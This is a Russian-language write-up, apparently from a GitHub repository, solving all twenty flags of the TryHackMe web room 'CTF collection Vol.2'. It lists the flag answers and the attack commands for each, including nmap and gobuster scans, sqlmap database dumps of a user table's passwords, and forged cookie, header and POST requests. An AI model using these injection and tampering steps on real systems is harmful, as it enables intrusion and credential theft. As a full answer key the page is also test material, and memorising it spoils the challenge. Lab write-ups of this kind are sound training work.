[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [CTF collection Vol.2](https://tryhackme.com/r/room/ctfcollectionvol2) 

Всего 2 задания:
## Задание 1
Добро пожаловать, добро пожаловать и добро пожаловать в очередную коллекцию CTF. Это вторая часть серии коллекций 
CTF. К вашему сведению, вторая серьезная часть фокусируется на веб-испытании. Всего в коробке можно найти 20 
пасхальных яиц, также известных как флаги. Давайте посмотрим, насколько хороши ваши навыки CTF.

Теперь запустите машину и соберите яйца!

Предупреждение: в задании есть изображения припадков и фон. Если вы чувствуете себя некомфортно, попробуйте удалить 
фон в теге <style>.

Примечание: все флаги задач имеют формат, если не указано иное.THM{flag}

### Ответьте на вопросы ниже
Факт: Яйца содержат белок самого высокого качества, который вы можете купить.
```commandline
Ответ не нужен
```

## Задание 2
Отправьте все ваши пасхальные яйца прямо сюда. Найду все!

### Ответьте на вопросы ниже
Пасха 1
```commandline
nmap -sSCV <IP>
gobuster dir -u http://<IP> -w directory-list-2.3-medium.txt -x php,html,txt
curl -s http://<IP>/robots.txt
echo "45 61 73 74 65 72 20 31 3a 20 54 48 4d 7b 34 75 37 30 62 30 37 5f 72 30 6c 6c 5f 30 75 37 7d" | xxd -r -p
```
```commandline
THM{4u70b07_r0ll_0u7}
```
Пасха 2
```commandline
urldecode $(echo "VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=" | base64 -d) | base64 -d | sed "s/\ //g" | base64 -d | sed "s/\ //g" | base64 -d
curl -s http://<IP>/DesKel_secret_base/
```
```commandline
THM{f4ll3n_b453}
```
Пасха 3
```commandline
curl -s http://<IP>/login/
```
```commandline
THM{y0u_c4n'7_533_m3}
```
Пасха 4
```commandline
sqlmap.py -r login.xml --current-db
sqlmap.py -r login.xml -D THM_f0und_m3 --tables
sqlmap.py -r login.xml -D THM_f0und_m3 -T nothing_inside --columns
sqlmap.py -r login.xml -D THM_f0und_m3 -T nothing_inside -C Easter_4 --sql-query "select Easter_4 from nothing_inside"
```
```commandline
THM{1nj3c7_l1k3_4_b055} 
```
Пасха 5
```commandline
sqlmap.py -r login.xml -D THM_f0und_m3 -T user --columns
sqlmap.py -r login.xml -D THM_f0und_m3 -T user -C username,password --sql-query "select username,password from user"
curl -s -d "username=DesKel&password=cutie&submit=submit" -X POST http://<IP>/login/ | grep Easter
```
```commandline
THM{wh47_d1d_17_c057_70_cr4ck_7h3_5ql}
```
Пасха 6
```commandline
curl -s 10.10.141.149 -D header.txt
cat header.txt 
```
```commandline
THM{l37'5_p4r7y_h4rd}
```
Пасха 7
```commandline
curl -s http://<IP>/ | grep "Who are you"
curl -s --cookie "Invited=1" http://<IP>/ | grep "easter 7"
```
```commandline
THM{w3lc0m3!_4nd_w3lc0m3}
```
Пасха 8
```commandline
curl -s http://<IP>/ | grep "Safari"
curl -s --user-agent "Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1" http://<IP>/ | grep "Easter 8"
```
```commandline
THM{h3y_r1ch3r_wh3r3_15_my_k1dn3y}
```
Пасха 9
```commandline
curl -s http://<IP>/ready/
```
```commandline
THM{60nn4_60_f457}
```
Пасха 10
```commandline
curl -s http://<IP>/free_sub/
curl -s --referer "tryhackme.com" http://<IP>/free_sub/
```
```commandline
THM{50rry_dud3}
```
Пасха 11
```commandline
curl -s http://<IP>/ | grep menu -B 1 -A 10
curl -s -d "dinner=salad" -X POST http://<IP>/ | grep menu -B 1 -A 12
curl -s -d "dinner=egg" -X POST http://<IP>/ | grep menu -B 1
```
```commandline
THM{366y_b4k3y}
```
Пасха 12
```commandline
curl -s http://<IP>/ | grep "\.js"
curl -s http://<IP>/jquery-9.1.2.js
```
```commandline
THM{h1dd3n_j5_f1l3}
```
Пасха 13
```commandline
curl -s http://<IP>/ready/gone.php
```
```commandline
THM{1_c4n'7_b3l13v3_17}
```
Пасха 14
```commandline
curl -s https://<IP> | grep Easter > data.txt
more data.txt
# decode base64
```
```commandline
THM{d1r3c7_3mb3d}
```
Пасха 15
```commandline
curl -s http://<IP>/game1/
curl -d "answer=ABCDEFGHIJKLMNOPQRSTUVWXYZ" -X POST http://<IP>/game1/
curl -d "answer=abcdefghijklmnopqrstuvwxyz" -X POST http://<IP>/game1/
curl -d "answer=GameOver" -X POST http://<IP>/game1/
```
```commandline
THM{ju57_4_64m3}
```
Пасха 16
```commandline
curl -s http://<IP>/game2/
curl -d "button1=button1&button2=button2&button3=button3" -X POST http://<IP>/game2/
```
```commandline
THM{73mp3r_7h3_h7ml}
```
Пасха 17
```commandline
bin -> dec -> hex -> ascii
b = '100010101100001011100110111010001100101011100100010000000110001001101110011101000100000010101000100100001001101011110110110101000110101010111110110101000110101010111110110101100110011011100000101111101100100001100110110001100110000011001000011001101111101'
d = int(b, 2)
h = hex(d)[2:]
bytes.fromhex(h).decode('ASCII')
```
```commandline
THM{j5_j5_k3p_d3c0d3}
```
Пасха 18
```commandline
curl -s -H "egg: Yes" http://<IP>/ | grep -i "Easter 18"
```
```commandline
THM{70ny_r0ll_7h3_366}
```
Пасха 19
```commandline
wget http://<IP>/small
file small.png
```
```commandline
THM{700_5m4ll_3yy}
```
Пасха 20
curl -s http://<IP>/ | grep "easter 20"
curl -s -d "username=DesKel&password=heIsDumb" -X POST http://<IP>/ | grep -A1 "easter 20"
```commandline
THM{17_w45_m3_4ll_4l0n6}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)